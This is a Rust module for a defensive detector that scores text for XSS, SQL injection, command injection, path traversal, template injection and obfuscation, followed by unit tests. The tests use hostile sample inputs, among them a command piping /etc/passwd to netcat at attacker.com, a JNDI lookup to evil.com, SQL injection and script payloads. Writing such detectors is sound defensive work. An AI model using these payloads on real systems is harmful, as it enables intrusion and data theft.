use std::collections::HashMap;
use std::sync::LazyLock;

use regex::Regex;

mod keywords;
mod patterns;

pub use keywords::AttackKeywords;
pub use patterns::AttackStructures;

const MAX_CONTENT_LENGTH: usize = 50_000;
const MAX_TOKENS: usize = 1000;
const MAX_ENTROPY_LENGTH: usize = 10_000;
const MAX_SCAN_LENGTH: usize = 10_000;

static INJECTION_KEYWORDS: &[&str] =
    &["eval", "exec", "compile", "__import__", "globals", "locals"];

// token extraction
static WORD_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b\w+\b").unwrap());

// encoding layer detection
static URL_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"%[0-9a-fA-F]{2}").unwrap());
static B64_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{4,}={0,2}").unwrap());
static HEX_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?:0x)?[0-9a-fA-F]{4,}").unwrap());
static UNICODE_ENC: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\\u[0-9a-fA-F]{4}").unwrap());
static HTML_ENT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"&[#\w]+;").unwrap());

// structural boost patterns
static SQL_STRUCT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\b(?:union|select|from|where)\b").unwrap());
static XSS_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"<[^>]+>").unwrap());
static CMD_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[;&|]").unwrap());
static PATH_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\.{2,}[/\\]").unwrap());

// obfuscation detection
static SPECIAL_CHAR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[^a-zA-Z0-9\s]").unwrap());
static LONG_RUN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\S{100,}").unwrap());

// code injection risk
static BRACES: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[\{\}].*[\{\}]").unwrap());
static FUNC_CALL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\w+\s*\([^)]*\)").unwrap());
static DOLLAR_VAR: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[$@]\w+").unwrap());
static OPERATORS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[=+\-*/]{2,}").unwrap());
static INJECTION_KW_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    INJECTION_KEYWORDS
        .iter()
        .filter_map(|kw| Regex::new(&format!(r"(?i)\b{kw}\b")).ok())
        .collect()
});

/// A structural pattern match with surrounding context.
#[derive(Debug, Clone)]
pub struct SuspiciousPattern {
    pub pattern_type: String,
    pub matched: String,
    pub position: usize,
    /// Substring surrounding the match (up to 20 chars each side).
    pub context: String,
}

/// Aggregate output of [`analyze`].
#[derive(Debug, Clone)]
pub struct AnalysisResult {
    /// Per-category scores (xss, sql, command, path, template) in `[0.0, 1.0]`.
    pub attack_probabilities: HashMap<&'static str, f64>,
    pub entropy: f64,
    pub encoding_layers: u32,
    pub is_obfuscated: bool,
    pub suspicious_patterns: Vec<SuspiciousPattern>,
    pub code_injection_risk: f64,
    pub token_count: usize,
}

#[doc(hidden)]
pub fn extract_tokens(content: &str, structures: &AttackStructures) -> Vec<String> {
    let content = if content.len() > MAX_CONTENT_LENGTH {
        &content[..MAX_CONTENT_LENGTH]
    } else {
        content
    };

    let lower = content.to_lowercase();
    let mut tokens: Vec<String> = WORD_RE
        .find_iter(&lower)
        .take(MAX_TOKENS)
        .map(|m| m.as_str().to_owned())
        .collect();

    let mut special_count = 0;

    for re in structures.compiled() {
        for m in re.find_iter(content) {
            tokens.push(m.as_str().to_owned());
            special_count += 1;

            if special_count >= 50 {
                break;
            }
        }

        if special_count >= 50 {
            break;
        }
    }

    tokens.truncate(MAX_TOKENS);
    tokens
}

/// Shannon entropy of byte distribution, in bits.
#[doc(hidden)]
#[must_use]
pub fn calculate_entropy(content: &str) -> f64 {
    if content.is_empty() {
        return 0.0;
    }

    let content = if content.len() > MAX_ENTROPY_LENGTH {
        &content[..MAX_ENTROPY_LENGTH]
    } else {
        content
    };

    let mut counts = [0u32; 256];
    let len = content.len() as f64;

    for byte in content.bytes() {
        counts[byte as usize] += 1;
    }

    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = f64::from(c) / len;
            -p * p.log2()
        })
        .sum()
}

/// Count encoding layers present (URL, base64, hex, unicode escape, HTML entity).
#[doc(hidden)]
#[must_use]
pub fn detect_encoding_layers(content: &str) -> u32 {
    let content = if content.len() > MAX_SCAN_LENGTH {
        &content[..MAX_SCAN_LENGTH]
    } else {
        content
    };

    [&*URL_ENC, &*B64_ENC, &*HEX_ENC, &*UNICODE_ENC, &*HTML_ENT]
        .iter()
        .map(|re| u32::from(re.is_match(content)))
        .sum()
}

#[doc(hidden)]
pub fn analyze_attack_probability(
    content: &str,
    keywords: &AttackKeywords,
    structures: &AttackStructures,
) -> HashMap<&'static str, f64> {
    let tokens = extract_tokens(content, structures);
    let token_set: std::collections::HashSet<&str> = tokens.iter().map(String::as_str).collect();

    let mut probabilities = HashMap::new();

    for (&attack_type, kw_set) in keywords.all() {
        if kw_set.is_empty() {
            probabilities.insert(attack_type, 0.0);
            continue;
        }

        let matches = token_set.iter().filter(|t| kw_set.contains(**t)).count();
        let base = matches as f64 / kw_set.len() as f64;
        let boost = structural_boost(attack_type, content);

        probabilities.insert(attack_type, (base + boost).min(1.0));
    }

    probabilities
}

#[doc(hidden)]
pub fn detect_obfuscation(content: &str) -> bool {
    calculate_entropy(content) > 4.5
        || detect_encoding_layers(content) > 2
        || {
            let special_count = SPECIAL_CHAR.find_iter(content).count();
            special_count as f64 / content.len().max(1) as f64 > 0.4
        }
        || LONG_RUN.is_match(content)
}

#[doc(hidden)]
#[must_use]
pub fn extract_suspicious_patterns(
    content: &str,
    structures: &AttackStructures,
) -> Vec<SuspiciousPattern> {
    structures
        .named()
        .iter()
        .flat_map(|(name, re)| {
            re.find_iter(content).map(move |m| {
                let ctx_start = m.start().saturating_sub(20);
                let ctx_end = (m.end() + 20).min(content.len());
                SuspiciousPattern {
                    pattern_type: (*name).to_owned(),
                    matched: m.as_str().to_owned(),
                    position: m.start(),
                    context: content[ctx_start..ctx_end].to_owned(),
                }
            })
        })
        .collect()
}

#[doc(hidden)]
#[must_use]
pub fn analyze_code_injection_risk(content: &str) -> f64 {
    let risk = check_code_pattern_risks(content) + check_injection_keywords(content);
    risk.min(1.0)
}

/// Run all analysis passes on `content` and return an [`AnalysisResult`].
///
/// Computes attack probabilities, entropy, encoding layers, obfuscation
/// detection, suspicious pattern extraction, and code injection risk in
/// a single pass.
#[must_use]
pub fn analyze(
    content: &str,
    keywords: &AttackKeywords,
    structures: &AttackStructures,
) -> AnalysisResult {
    let tokens = extract_tokens(content, structures);
    AnalysisResult {
        attack_probabilities: analyze_attack_probability(content, keywords, structures),
        entropy: calculate_entropy(content),
        encoding_layers: detect_encoding_layers(content),
        is_obfuscated: detect_obfuscation(content),
        suspicious_patterns: extract_suspicious_patterns(content, structures),
        code_injection_risk: analyze_code_injection_risk(content),
        token_count: tokens.len(),
    }
}

/// Weighted aggregate of an [`AnalysisResult`] into a single `[0.0, 1.0]`
/// threat score.
///
/// Weights: attack probability 30%, obfuscation 20%, encoding layers 10-20%,
/// code injection risk 20%, suspicious pattern count 5-10%.
pub fn get_threat_score(result: &AnalysisResult) -> f64 {
    let mut score = 0.0;

    if !result.attack_probabilities.is_empty() {
        let max_prob = result
            .attack_probabilities
            .values()
            .copied()
            .fold(0.0_f64, f64::max);
        score = max_prob.mul_add(0.3, score);
    }

    if result.is_obfuscated {
        score += 0.2;
    }

    if result.encoding_layers > 0 {
        score += (f64::from(result.encoding_layers) * 0.1).min(0.2);
    }

    score = result.code_injection_risk.mul_add(0.2, score);

    if !result.suspicious_patterns.is_empty() {
        score += (result.suspicious_patterns.len() as f64 * 0.05).min(0.1);
    }

    score.min(1.0)
}

fn structural_boost(attack_type: &str, content: &str) -> f64 {
    let re = match attack_type {
        "xss" => &*XSS_STRUCT,
        "sql" => &*SQL_STRUCT,
        "command" => &*CMD_STRUCT,
        "path" => &*PATH_STRUCT,
        _ => return 0.0,
    };

    if re.is_match(content) { 0.3 } else { 0.0 }
}

fn check_code_pattern_risks(content: &str) -> f64 {
    let mut risk = 0.0;

    if BRACES.is_match(content) {
        risk += 0.2;
    }
    if FUNC_CALL.is_match(content) {
        risk += 0.2;
    }
    if DOLLAR_VAR.is_match(content) {
        risk += 0.1;
    }
    if OPERATORS.is_match(content) {
        risk += 0.1;
    }

    risk
}

fn check_injection_keywords(content: &str) -> f64 {
    if INJECTION_KW_RE.iter().any(|re| re.is_match(content)) {
        0.2
    } else {
        0.0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kw() -> AttackKeywords {
        AttackKeywords::default()
    }
    fn st() -> AttackStructures {
        AttackStructures::default()
    }

    #[test]
    fn entropy_empty() {
        assert!(calculate_entropy("").abs() < f64::EPSILON);
    }

    #[test]
    fn entropy_uniform() {
        let s = "abcdefghij".repeat(200);
        let e = calculate_entropy(&s);
        assert!(e > 3.0);
    }

    #[test]
    fn encoding_layers_url() {
        assert!(detect_encoding_layers("%3Cscript%3E") >= 1);
    }

    #[test]
    fn encoding_layers_multiple() {
        let content = "%3C &lt; \\u003C 0x3C3C AAAA==";
        assert!(detect_encoding_layers(content) >= 3);
    }

    #[test]
    fn xss_detection() {
        let probs = analyze_attack_probability("<img src=x onerror=alert(1)>", &kw(), &st());
        assert!(probs["xss"] > 0.3);
    }

    #[test]
    fn sql_injection_detection() {
        let probs =
            analyze_attack_probability("1' OR '1'='1' UNION SELECT * FROM users--", &kw(), &st());
        assert!(probs["sql"] > 0.3);
    }

    #[test]
    fn command_injection_detection() {
        let probs = analyze_attack_probability(
            "test; cat /etc/passwd | nc attacker.com 9999",
            &kw(),
            &st(),
        );
        assert!(probs["command"] > 0.3);
    }

    #[test]
    fn path_traversal_detection() {
        let probs = analyze_attack_probability("../../etc/passwd", &kw(), &st());
        assert!(probs["path"] > 0.3);
    }

    #[test]
    fn obfuscation_high_entropy() {
        let content: String = (0u32..100)
            .map(|i| char::from(b'!' + ((i * 7 + 13) % 94) as u8))
            .collect();
        assert!(detect_obfuscation(&content));
    }

    #[test]
    fn obfuscation_special_chars() {
        let content = "!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`".repeat(3) + "normal";
        assert!(detect_obfuscation(&content));
    }

    #[test]
    fn code_injection_risk_brackets() {
        assert!(analyze_code_injection_risk("{malicious} code {injection}") >= 0.2);
    }

    #[test]
    fn code_injection_risk_keywords() {
        assert!(analyze_code_injection_risk("eval(user_input) and exec(command)") >= 0.4);
    }

    #[test]
    fn full_analysis_xss_sqli() {
        let content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users";
        let result = analyze(content, &kw(), &st());

        assert!(result.attack_probabilities["xss"] > 0.0);
        assert!(result.attack_probabilities["sql"] > 0.0);
        assert!(result.token_count > 0);
    }

    #[test]
    fn threat_score_high() {
        let result = AnalysisResult {
            attack_probabilities: HashMap::from([("xss", 0.8), ("sql", 0.6)]),
            entropy: 5.0,
            encoding_layers: 2,
            is_obfuscated: true,
            suspicious_patterns: vec![
                SuspiciousPattern {
                    pattern_type: "tag_like".into(),
                    matched: "<script>".into(),
                    position: 0,
                    context: "<script>".into(),
                },
                SuspiciousPattern {
                    pattern_type: "function_call".into(),
                    matched: "alert(1)".into(),
                    position: 8,
                    context: "alert(1)".into(),
                },
            ],
            code_injection_risk: 0.5,
            token_count: 10,
        };
        let score = get_threat_score(&result);
        assert!(score > 0.5);
        assert!(score <= 1.0);
    }

    #[test]
    fn threat_score_zero() {
        let result = AnalysisResult {
            attack_probabilities: HashMap::new(),
            entropy: 0.0,
            encoding_layers: 0,
            is_obfuscated: false,
            suspicious_patterns: vec![],
            code_injection_risk: 0.0,
            token_count: 0,
        };
        assert!(get_threat_score(&result).abs() < f64::EPSILON);
    }

    #[test]
    fn extract_tokens_respects_limits() {
        let content = "a ".repeat(30000);
        let tokens = extract_tokens(&content, &st());
        assert!(tokens.len() <= MAX_TOKENS);
    }

    #[test]
    fn suspicious_patterns_found() {
        let content = "normal <script>alert(1)</script> text with function() call";
        let patterns = extract_suspicious_patterns(content, &st());
        assert!(!patterns.is_empty());
        assert!(patterns.iter().any(|p| p.pattern_type == "tag_like"));
    }

    #[test]
    fn mixed_case_sql_keywords() {
        let probs = analyze_attack_probability("SeLeCt * FrOm UsErS UnIoN sElEcT", &kw(), &st());
        assert!(probs["sql"] > 0.0);
    }

    #[test]
    fn unicode_content() {
        let probs = analyze_attack_probability(
            "测试 <script>alert('χαίρετε')</script> اختبار",
            &kw(),
            &st(),
        );
        assert!(probs["xss"] > 0.0);
    }

    #[test]
    fn long_string_obfuscation() {
        assert!(detect_obfuscation(&"a".repeat(150)));
    }

    #[test]
    fn template_injection() {
        let result = analyze(
            "{{7*7}} ${jndi:ldap://evil.com/a} {%if%}evil{%endif%}",
            &kw(),
            &st(),
        );
        assert!(!result.suspicious_patterns.is_empty());
    }

    #[test]
    fn keywords_initialized() {
        let keywords = kw();
        let all = keywords.all();
        assert!(all.contains_key("xss"));
        assert!(all.contains_key("sql"));
        assert!(all.contains_key("command"));
        assert!(all.contains_key("path"));
        assert!(all.contains_key("template"));
        assert!(all["xss"].contains("script"));
        assert!(all["sql"].contains("select"));
        assert!(all["command"].contains("exec"));
    }

    #[test]
    fn empty_keywords_zero_score() {
        let probs = analyze_attack_probability("test content", &kw(), &st());
        assert!(probs["template"] < 0.5);
    }

    #[test]
    fn command_pattern_with_pipe() {
        let probs =
            analyze_attack_probability("exec command; cat /etc/passwd | grep root", &kw(), &st());
        assert!(probs["command"] > 0.3);
    }

    #[test]
    fn encoding_layers_html_entities() {
        let content = "normal text &lt;script&gt;alert(1)&lt;/script&gt;";
        assert!(detect_encoding_layers(content) >= 1);
    }

    #[test]
    fn encoding_layers_max_scan_length() {
        let content = format!("{}{}", "normal text ".repeat(1000), "%3Cscript%3E");
        let _ = detect_encoding_layers(&content);
    }

    #[test]
    fn comprehensive_analyze_keys() {
        let content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users";
        let result = analyze(content, &kw(), &st());
        assert!(result.attack_probabilities.contains_key("xss"));
        assert!(result.attack_probabilities.contains_key("sql"));
        assert!(result.entropy > 0.0);
        assert!(result.token_count > 0);
    }

    #[test]
    fn threat_score_bounded() {
        let content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users";
        let result = analyze(content, &kw(), &st());
        let score = get_threat_score(&result);
        assert!((0.0..=1.0).contains(&score));
    }

    #[test]
    fn suspicious_pattern_has_context() {
        let content = "normal <script>alert(1)</script> text with function() call";
        let patterns = extract_suspicious_patterns(content, &st());
        for p in &patterns {
            assert!(!p.pattern_type.is_empty());
            assert!(!p.matched.is_empty());
            assert!(!p.context.is_empty());
        }
    }

    #[test]
    fn obfuscated_base64() {
        let result = analyze("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", &kw(), &st());
        assert!(result.is_obfuscated);
        assert!(result.encoding_layers > 0);
    }

    #[test]
    fn code_injection_risk_variables() {
        assert!(analyze_code_injection_risk("$variable @another_var ${complex}") >= 0.1);
    }

    #[test]
    fn performance_large_input() {
        let content = format!("{}<script>alert(1)</script>", "normal text ".repeat(10000));
        let start = std::time::Instant::now();
        let result = analyze(&content, &kw(), &st());
        let duration = start.elapsed();
        assert!(duration.as_secs_f64() < 1.0);
        assert!(result.token_count <= MAX_TOKENS);
    }

    #[test]
    fn multiple_encoding_layers_detected() {
        let content = "%3Cscript%3E&lt;test&gt;\\u0041\\u0042";
        let layers = detect_encoding_layers(content);
        assert!(layers > 2);
        assert!(detect_obfuscation(content));
    }
}
